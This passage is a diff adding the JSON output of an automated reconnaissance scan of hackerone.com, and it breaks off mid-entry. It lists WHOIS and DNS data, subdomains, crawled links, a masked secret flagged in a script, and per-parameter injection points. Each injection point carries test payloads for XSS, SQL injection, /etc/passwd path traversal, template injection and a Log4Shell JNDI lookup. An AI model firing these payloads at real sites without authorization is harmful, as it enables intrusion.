@@ -1,0 +1,1533 @@
+{
+  "scan_info": {
+    "target": "https://hackerone.com",
+    "domain": "hackerone.com",
+    "started_at": "2026-05-12T16:28:17.619081",
+    "duration_seconds": 135.03,
+    "browser_used": false
+  },
+  "domain_info": {
+    "target": "https://hackerone.com",
+    "domain": "hackerone.com",
+    "root_domain": "hackerone.com",
+    "ip": "172.64.151.42",
+    "whois": {
+      "raw": "   Domain Name: HACKERONE.COM\n   Registry Domain ID: 1341985685_DOMAIN_COM-VRSN\n   Registrar WHOIS Server: whois.cloudflare.com\n   Registrar URL: http://www.cloudflare.com\n   Updated Date: 2025-08-29T12:00:29Z\n   Creation Date: 2007-11-26T19:45:36Z\n   Registry Expiry Date: 2026-11-26T19:45:36Z\n   Registrar: Cloudflare, Inc.\n   Registrar IANA ID: 1910\n   Registrar Abuse Contact Email: registrar-abuse@cloudflare.com\n   Registrar Abuse Contact Phone: +1.6503198930\n   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Domain Status: serverDeleteProhibited https://icann.org/epp#serverDeleteProhibited\n   Domain Status: serverTransferProhibited https://icann.org/epp#serverTransferProhibited\n   Domain Status: serverUpdateProhibited https://icann.org/epp#serverUpdateProhibited\n   Name Server: A.NS.HACKERONE.COM\n   Name Server: B.NS.HACKERONE.COM\n   DNSSEC: signedDelegation\n   DNSSEC DS Data: 2371 13 2 5BB3CF845BAE1692299CCE6623AF80AC8B8AB20434796D754FD20634C7282D87\n   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n>>> Last update of whois database: 2026-05-12T16:25:45Z <<<\n\nFor more information on Whois status codes, please visit https://icann.org/epp\n\nNOTICE: The expiration date displayed in this record is the date the\nregistrar's sponsorship of the domain name registration in the registry is\ncurrently set to expire. This date does not necessarily reflect the expiration\ndate of the domain name registrant's agreement with the sponsoring\nregistrar.  Users may consult the sponsoring registrar's Whois database to\nview the registrar's reported date of expiration for this registration.\n\nTERMS OF USE: You are not authorized to access or query our Whois\ndatabase through the use of electronic processes that are high-volume and\nautomated except as reasonably necessary to register domain names or\nmodify existing registrations; the Data in VeriSign Global Registry\nServices' (\"VeriSign\") Whois database is provided by VeriSign for\ninformation purposes only, and to assist persons in obtaining information\nabout or related to a domain name registration record. VeriSign does not\nguarantee its accuracy. By submitting a Whois query, you agree to abide\nby the following terms of use: You agree that you may use this Data only\nfor lawful purposes and that under no circumstances will you use this Data\nto: (1) allow, enable, or otherwise support the transmission of mass\nunsolicited, commercial advertising or solicitations via e-mail, telephone,\nor facsimile; or (2) enable high volume, automated, electronic processes\nthat apply to VeriSign (or its computer systems). The compilation,\nrepackaging, dissemination or other use of this Data is expressly\nprohibited without the prior written consent of VeriSign. You agree not to\nuse electronic process",
+      "parsed": {
+        "creation_date": [
+          "2007-11-26T19:45:36Z",
+          "2007-11-26T19:45:36Z"
+        ],
+        "registrar": [
+          "Cloudflare, Inc.",
+          "Cloudflare, Inc."
+        ],
+        "name_server": [
+          "A.NS.HACKERONE.COM",
+          "B.NS.HACKERONE.COM",
+          "a.ns.hackerone.com",
+          "b.ns.hackerone.com"
+        ]
+      }
+    },
+    "dns_records": {
+      "A": [
+        "172.64.151.42",
+        "104.18.36.214"
+      ],
+      "MX": [
+        "30 aspmx3.googlemail.com.",
+        "30 aspmx2.googlemail.com.",
+        "10 aspmx.l.google.com.",
+        "20 alt2.aspmx.l.google.com.",
+        "20 alt1.aspmx.l.google.com."
+      ],
+      "NS": [
+        "b.ns.hackerone.com.",
+        "a.ns.hackerone.com."
+      ],
+      "TXT": [
+        "\"atlassian-domain-verification=JpJ4g3munTo9KsuR3Elcdpn97c+KQV7KDjj2YmE+ULiWhGlcfA5f1ivoC0W2puQk\"",
+        "\"onetrust-domain-verification=0be23834ba1d435eb1748ba6b36d8b0c\"",
+        "\"v=spf1 include:_spf.google.com include:amazonses.com include:mail.zendesk.com include:spf.mail.intercom.io include:mktomail.com include:registrarmail.net -all\"",
+        "\"ZOOM_verify_pzZpSwKqRx6pAD9lLkSl5g\"",
+        "\"drift-domain-verification=18fef5450d713c159ad9f6309fa338d298c11edd56fb22e343d758fb5f58437f\"",
+        "\"_56ra2mupvxu61g49yhns1uxv031fxcy\"",
+        "\"cloudpiercer-verification=32e7eea9d2f153b176b182626588bc77\"",
+        "\"wework-site-verification=e0czKzmn7ul5Cr9A\"",
+        "\"anthropic-domain-verification-5523sh=llRss235wbPm41lcmiUhdf93T\"",
+        "\"monday-com-verification=uj2Ko666o6C_Gc_vbCiQ6n7ruARZpX0U3I0bocalW60\"",
+        "\"c06l6z7hp4vk6bzpqb1j6b8w1m64nf84\"",
+        "\"apple-domain-verification=YOO9EuQfVRiqtbWi\"",
+        "\"h1-domain-verification=LDEQA8SYNEMgdUN1kfMtjFNptDJcnjKN8LxNHCN3JNvT5Fxo\"",
+        "\"google-site-verification=mKdqQzjtY7X20BzUFnhAmFU2pmtFJ_Zie_S22FiwubA\"",
+        "\"google-site-verification=iKe1wvhRzxTmexGrBcrDplrCvBL-PL2Mgf4VZQAfYNs\"",
+        "\"google-site-verification=3LAOq3Z_u6zVOJHlZW0I7tuQpCPvZHC9JBZMk3e20mk\"",
+        "\"google-site-verification=kOO_QjqFZ7fbwXaF0PiMcK2OMQL5nTVBiM21SsO9Olk\"",
+        "\"MS=ms75772789\"",
+        "\"_muuhv6zkwwnyy8b6x1ei4m8hrtsm17g\"",
+        "\"box-domain-verification=8b89b955ef91d29f746acc1a7147aa9490922028fcf458e98b62aa769136d99b\"",
+        "\"zapier-domain-verification-challenge=d1be5c1b-f415-418f-9542-abc14d8321af\"",
+        "\"70gn9hp69jzpn3nkp42r8n9jwwtd1d70\"",
+        "\"ethiack-verification=efd57ccd9a94d6363d89e0a992e872c6ff651a41d1091228978021da750ac30dbb01c2ae6d65e0cf9d7edfbe198aef554577505a50a736d1d0dbb6b17282710b\"",
+        "\"facebook-domain-verification=niq4ke9m7djq4jt36f02t093aig8a5\"",
+        "\"docusign=848c7864-3a91-42aa-8e30-2671086f7516\"",
+        "\"0q8zpfvc64swgyy9wwwrjl7vgwrfffbf\"",
+        "\"wayback=verification for request #673161\"",
+        "\"slack-domain-verification=cQndsOjWj4XDM9icHSNlvtrh3r1jfQMQTfhDNxiz\"",
+        "\"jetbrains-domain-verification=69ifho5wgkblhail93kc83elv\"",
+        "\"stripe-verification=20c821f6e4dfc5ee358ea9b8e4635cf062a2acac5751f8004d23b122f1cb5ac2\"",
+        "\"canva-site-verification=RY1pq8pQpGqV1RdvvgatQA\"",
+        "\"clayton-domain-verification=d21920d13f0a60c931f46d440f6c87526f656b0377\"",
+        "\"4b7570f2564f4074b42872e1d78668ad\"",
+        "\"adobe-idp-site-verification=5d77b0274800290cf193145126595b14308358f46dfe90eba5e298f99d32d2fc\"",
+        "\"citrix-verification-code=9c920630-2d05-4154-b72a-1021665d3b58\"",
+        "\"openai-domain-verification=dv-8UsaxQU6vJQfWNS8d3FBK4et\"",
+        "\"stripe-verification=74802599834dfbfc093c8352686c992d22e7b20a6fdcfceac2e6a846074d6936\"",
+        "\"protonmail-verification=f3b0af7c5614dbdf82c5bdebc6014593c05b92f6\""
+      ]
+    }
+  },
+  "subdomains": [
+    "api.hackerone.com",
+    "api.hackerone.com\ndocs.hackerone.com\nhackerone.com\nwww.hackerone.com",
+    "api.hackerone.com\ndocs.hackerone.com\nmta-sts.forwarding.hackerone.com\ngslink.hackerone.com\nmta-sts.managed.hackerone.com\nmta-sts.hackerone.com\na.ns.hackerone.com\nb.ns.hackerone.com\nsupport.hackerone.com\nwww.hackerone.com\nhackerone.com\nwearehackerone.com\napi.hackerone.com\ndocs.hackerone.com\nhackerone.com\nwww.hackerone.com\napi.hackerone.com\nhackerone.com\nwww.hackerone.com\nwebsockets.hackerone.com\ndesign.hackerone.com\nevents.hackerone.com\nhackerone.com\nwww.hackerone.com\napi.hackerone.com\nwww.hackerone.com\nhackerone.com\nhackerone.com\nlinks.hackerone.com\ngo.hackerone.com\ninfo.hackerone.com",
+    "api.hackerone.com\nhackerone.com\nwww.hackerone.com",
+    "api.hackerone.com\nwww.hackerone.com",
+    "design.hackerone.com",
+    "docs.hackerone.com",
+    "events.hackerone.com",
+    "go.hackerone.com\ninfo.hackerone.com",
+    "gslink.hackerone.com",
+    "hackerone.com\nwww.hackerone.com",
+    "links.hackerone.com",
+    "mta-sts.forwarding.hackerone.com",
+    "mta-sts.hackerone.com",
+    "mta-sts.managed.hackerone.com",
+    "support.hackerone.com",
+    "websockets.hackerone.com",
+    "www.hackerone.com"
+  ],
+  "links": [
+    "https://docs.hackerone.com/",
+    "https://docs.hackerone.com/en/",
+    "https://embed-ssl.wistia.com/deliveries/7c6734b76e919a9df2bd30cfcc59bab82b125f6c.mp4",
+    "https://embed-ssl.wistia.com/deliveries/e8c490c679c96d5e3f2e06442498be1a7faed416.jpg",
+    "https://h1.community/events/#/list",
+    "https://hackerone.com/",
+    "https://hackerone.com/blog",
+    "https://hackerone.com/blog/ctem-validation-return-on-mitigation",
+    "https://hackerone.com/careers",
+    "https://hackerone.com/company",
+    "https://hackerone.com/company/leadership",
+    "https://hackerone.com/company/newsroom",
+    "https://hackerone.com/company/public-policy",
+    "https://hackerone.com/contact",
+    "https://hackerone.com/contact/security-incident",
+    "https://hackerone.com/core/assets/vendor/jquery/jquery.min.js?v=4.0.0",
+    "https://hackerone.com/events",
+    "https://hackerone.com/hackers",
+    "https://hackerone.com/hackers/ambassador-world-cup",
+    "https://hackerone.com/hackers/how-to-start-hacking",
+    "https://hackerone.com/hub/continuous-validation",
+    "https://hackerone.com/knowledge-center/16-types-cybersecurity-attacks-and-how-prevent-them",
+    "https://hackerone.com/knowledge-center/what-application-security-concepts-tools-best-practices",
+    "https://hackerone.com/knowledge-center/what-hacking-black-hat-white-hat-blue-hat-and-more",
+    "https://hackerone.com/knowledge-center/what-is-penetration-testing-as-a-service",
+    "https://hackerone.com/leaderboard",
+    "https://hackerone.com/modules/contrib/google_tag/js/gtag.js?tebodv",
+    "https://hackerone.com/modules/contrib/google_tag/js/gtm.js?tebodv",
+    "https://hackerone.com/opportunities/all",
+    "https://hackerone.com/partners",
+    "https://hackerone.com/partners/aws",
+    "https://hackerone.com/partners/find-a-partner",
+    "https://hackerone.com/partners/integrations",
+    "https://hackerone.com/partners/technology-alliance-program",
+    "https://hackerone.com/platform",
+    "https://hackerone.com/platform/hai",
+    "https://hackerone.com/platform/insights",
+    "https://hackerone.com/platform/live-hacking-events",
+    "https://hackerone.com/platform/services",
+    "https://hackerone.com/platform/triage",
+    "https://hackerone.com/policies",
+    "https://hackerone.com/policies/privacy",
+    "https://hackerone.com/product/ai-red-teaming",
+    "https://hackerone.com/product/bug-bounty-platform",
+    "https://hackerone.com/product/challenge",
+    "https://hackerone.com/product/code",
+    "https://hackerone.com/product/pentest",
+    "https://hackerone.com/product/response-vulnerability-disclosure-program",
+    "https://hackerone.com/report/future-of-ai",
+    "https://hackerone.com/report/hacker-powered-security",
+    "https://hackerone.com/resources",
+    "https://hackerone.com/security?type=team",
+    "https://hackerone.com/sitemap.xml?first=0",
+    "https://hackerone.com/sitemap.xml?first=1",
+    "https://hackerone.com/sitemap.xml?first=2",
+    "https://hackerone.com/sitemap.xml?first=3",
+    "https://hackerone.com/sitemap.xml?first=4",
+    "https://hackerone.com/sitemap.xml?first=5",
+    "https://hackerone.com/sitemap.xml?first=6",
+    "https://hackerone.com/sitemap.xml?first=7",
+    "https://hackerone.com/sitemap.xml?first=8",
+    "https://hackerone.com/sitemap.xml?first=9",
+    "https://hackerone.com/sitemap.xml?first=a",
+    "https://hackerone.com/sitemap.xml?first=b",
+    "https://hackerone.com/sitemap.xml?first=c",
+    "https://hackerone.com/sitemap.xml?first=d",
+    "https://hackerone.com/sitemap.xml?first=e",
+    "https://hackerone.com/sitemap.xml?first=f",
+    "https://hackerone.com/sitemap.xml?first=g",
+    "https://hackerone.com/sitemap.xml?first=h",
+    "https://hackerone.com/sitemap.xml?first=i",
+    "https://hackerone.com/sitemap.xml?first=j",
+    "https://hackerone.com/sitemap.xml?first=k",
+    "https://hackerone.com/sitemap.xml?first=l",
+    "https://hackerone.com/sitemap.xml?first=m",
+    "https://hackerone.com/sitemap.xml?first=n",
+    "https://hackerone.com/sitemap.xml?first=o",
+    "https://hackerone.com/sitemap.xml?first=p",
+    "https://hackerone.com/sitemap.xml?first=q",
+    "https://hackerone.com/sitemap.xml?first=r",
+    "https://hackerone.com/sitemap.xml?first=s",
+    "https://hackerone.com/sitemap.xml?first=t",
+    "https://hackerone.com/sitemap.xml?first=u",
+    "https://hackerone.com/sitemap.xml?first=v",
+    "https://hackerone.com/sitemap.xml?first=w",
+    "https://hackerone.com/sitemap.xml?first=x",
+    "https://hackerone.com/sitemap.xml?first=y",
+    "https://hackerone.com/sitemap.xml?first=z",
+    "https://hackerone.com/sitemap/base.xml",
+    "https://hackerone.com/sites/default/files/css/css_Edq5zLyAUlVP35PQt0bah4mfuHg2C-Rqzw3b0153L90.css?delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+    "https://hackerone.com/sites/default/files/css/css_HgjmNfXtjkDqwTpKqeJZpKKPd7qdGIcXQqIAAkvAAzI.css?delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxNjVEOgyAQBS-EeqYHbsG6smQXjNzepqkpnzPvJRNEaVm1FfCMNy5HV-Ut74_7oUsIO6lkWjyMBowsHjxZ7Z9fHIaDzBDJBlVQ0wuhivZJTlJGdwWKqCjJnuTfzC2X5nmzRKuzbpWOb_4G-e5GrA",
+    "https://hackerone.com/sites/default/files/js/js_LJuxJuhg4ojkaJdq74OTZt8lkloL-jV-VsALJ-k7V-k.js?scope=header&amp;delta=0&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+    "https://hackerone.com/sites/default/files/js/js_ZvFHRyE9-fp1_bUPjPYJktyaqqaiHqojAsEiHEZ7pLc.js?scope=footer&amp;delta=1&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+    "https://hackerone.com/sites/default/files/js/js_q278e2vWZDd9G59RWht2shOHNvp3P7QNTCMYb9-Jihs.js?scope=footer&amp;delta=3&amp;language=en&amp;theme=hackerone&amp;include=eJxdzuEKgzAMBOAXsit7onLVLGamjdRM9O0n22BufwL3HRyhzVXqFIf2mKEXeseOzVgpOTjycf7zBXdsv1i6Ef1EzSpFVsvQsPRNZl9OxXgtaBO5nWyGjzf0bm0PtlJT7KfWaXEpVgV6HlqhMsDF6hcTShaqnjKnVQay-IGQObwguPHx8RNLsV7S",
+    "https://hackerone.com/sites/default/files/styles/max_500x500/public/2025-09/Website---CTA-Card-%28homepage-What%27s-New%2C-etc.%29-%281%29.png.webp?itok=7fg-7Cc6",
+    "https://hackerone.com/sites/default/files/styles/max_500x500/public/2026-04/1-1.png.webp?itok=9L9qoiZ9",
+    "https://hackerone.com/sites/default/files/styles/max_500x500/public/2026-04/October-2-LinkedIn.png.webp?itok=IK1Z4DD2",
+    "https://hackerone.com/sites/default/files/styles/max_700x700/public/2026-04/Web_FY27Researchers.png.webp?itok=2T6f6bQE",
+    "https://hackerone.com/sites/default/files/styles/max_800x800/public/2026-04/Web_FY27-10.png.webp?itok=s2bjV2O5",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/Anthropic_light.png.webp?itok=xsxYddJZ",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/adobe_dark.png.webp?itok=AM-Wgy0M",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/adobe_light.png.webp?itok=axfXZswU",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/ibm_light.png.webp?itok=f51Y0ZJk",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/paypal_dark.png.webp?itok=-FRJG-cg",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/salesforce_dark.png.webp?itok=LR4swYcQ",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/salesforce_light.png.webp?itok=QlS8uNrp",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/shopify_dark.png.webp?itok=_paHah_E",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/snapchat_dark.png.webp?itok=tW2gr3pi",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/snapchat_light.png.webp?itok=NHiDjBkI",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/uber_dark.png.webp?itok=8-I0OJ6_",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-01/uber_light.png.webp?itok=MsX-RFdg",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/Zoom_dark.png.webp?itok=ADKU8Mit",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/Zoom_light.png.webp?itok=AVO7JFeu",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2025-02/cryptocom_light.png.webp?itok=QCATTilk",
+    "https://hackerone.com/sites/default/files/styles/medium/public/customer-logos/2026-04/WULogo_Web_FY27.png.webp?itok=hqzTu4yZ",
+    "https://hackerone.com/sites/default/files/styles/thumbnail/public/2025-04/jim-higgins.jpeg.webp?itok=Eov6F6M_",
+    "https://hackerone.com/sites/default/files/styles/thumbnail/public/2026-04/weiss.png.webp?itok=uwvqFRqa",
+    "https://hackerone.com/solutions",
+    "https://hackerone.com/solutions/adversarial-exposure-validation",
+    "https://hackerone.com/solutions/ai",
+    "https://hackerone.com/solutions/application-security-testing-software",
+    "https://hackerone.com/solutions/automotive-and-transportation",
+    "https://hackerone.com/solutions/cloud-security-solution",
+    "https://hackerone.com/solutions/continuous-security-testing",
+    "https://hackerone.com/solutions/continuous-threat-exposure-management",
+    "https://hackerone.com/solutions/continuous-vulnerability-testing",
+    "https://hackerone.com/solutions/crowdsourced-security",
+    "https://hackerone.com/solutions/crypto-blockchain",
+    "https://hackerone.com/solutions/financial-services",
+    "https://hackerone.com/solutions/healthcare",
+    "https://hackerone.com/solutions/public-sector",
+    "https://hackerone.com/solutions/retail-ecommerce",
+    "https://hackerone.com/solutions/retail-hospitality-and-entertainment",
+    "https://hackerone.com/solutions/uk-government",
+    "https://hackerone.com/solutions/united-states-federal",
+    "https://hackerone.com/solutions/vulnerability-management-system",
+    "https://hackerone.com/solutions/web3",
+    "https://hackerone.com/terms",
+    "https://hackerone.com/themes/custom/hackerone/assets/favicons/apple-touch-icon.png",
+    "https://hackerone.com/themes/custom/hackerone/assets/favicons/favicon.ico",
+    "https://hackerone.com/themes/custom/hackerone/assets/favicons/favicon.svg",
+    "https://hackerone.com/themes/custom/hackerone/assets/favicons/manifest.webmanifest",
+    "https://hackerone.com/themes/custom/hackerone/logo.svg",
+    "https://hackerone.com/trust",
+    "https://hackerone.com/users/sign_in",
+    "https://hackerone.com/vulnerability-disclosure-policy-map",
+    "https://hackerone.com/why-hackerone",
+    "https://ma.hacker.one/js/forms2/js/forms2.min.js",
+    "https://www.facebook.com/Hacker0x01",
+    "https://www.googletagmanager.com/ns.html?id=GTM-KLQXL8V",
+    "https://www.hackerone-partners.com/",
+    "https://www.hackerone.com/",
+    "https://www.hackerone.com/customer-stories/adobe",
+    "https://www.hackerone.com/customer-stories/snap",
+    "https://www.hackerone.com/platform/community",
+    "https://www.hackerone.com/report/hacker-powered-security",
+    "https://www.hackerone.com/report/security-testing-for-ai-coverage-gap",
+    "https://www.hackerone.com/resources",
+    "https://www.hackerone.com/resources/customer-story",
+    "https://www.hackerone.com/sitemap.xml",
+    "https://www.instagram.com/hacker0x01",
+    "https://www.linkedin.com/company/hackerone",
+    "https://www.x.com/Hacker0x01"
+  ],
+  "js_analysis": {
+    "total_files_analyzed": 1,
+    "endpoints_found": [],
+    "parameters_found": [
+      "a",
+      "ajaxSuccess",
+      "b",
+      "border",
+      "callback",
+      "class",
+      "d",
+      "e",
+      "f",
+      "focus",
+      "for",
+      "g",
+      "hide",
+      "i",
+      "j",
+      "k",
+      "margin",
+      "munchkinId",
+      "nextSibling",
+      "null",
+      "onload",
+      "script",
+      "true",
+      "url",
+      "w"
+    ],
+    "secrets_found": [
+      {
+        "type": "Basic Auth",
+        "masked_value": "****",
+        "source": "https://ma.hacker.one/js/forms2/js/forms2.min.js",
+        "severity": "High"
+      }
+    ],
+    "api_base_urls": [],
+    "developer_comments": [],
+    "interesting_strings": []
+  },
+  "parameters": {
+    "total_injection_points": 85,
+    "parameters_by_category": {
+      "id_params": [
+        "id"
+      ],
+      "search_params": [
+        "first",
+        "scope"
+      ],
+      "auth_params": [],
+      "redirect_params": [],
+      "file_params": [],
+      "pagination_params": [],
+      "debug_params": [],
+      "other_params": [
+        "amp;delta",
+        "amp;include",
+        "amp;language",
+        "amp;theme",
+        "delta",
+        "itok",
+        "type",
+        "v"
+      ]
+    },
+    "injection_points": [
+      {
+        "url": "https://hackerone.com/core/assets/vendor/jquery/jquery.min.js?v=4.0.0",
+        "parameter": "v",
+        "type": "Unknown / Fuzz",
+        "sample_value": "4.0.0",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/security?type=team",
+        "parameter": "type",
+        "type": "Unknown / Fuzz",
+        "sample_value": "team",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=0",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "0",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=1",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "1",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=2",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "2",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=3",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "3",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=4",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "4",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=5",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "5",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=6",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "6",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=7",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "7",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=8",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "8",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=9",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "9",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=a",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "a",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=b",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "b",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=c",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "c",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=d",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "d",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=e",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "e",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=f",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "f",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=g",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "g",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=h",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "h",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=i",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "i",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=j",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "j",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=k",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
+        "sample_value": "k",
+        "test_payloads": [
+          "<script>alert(1)</script>",
+          "' OR '1'='1",
+          "../../../etc/passwd",
+          "{{7*7}}",
+          "${jndi:ldap://x}"
+        ]
+      },
+      {
+        "url": "https://hackerone.com/sitemap.xml?first=l",
+        "parameter": "first",
+        "type": "XSS / SQLi / Search",
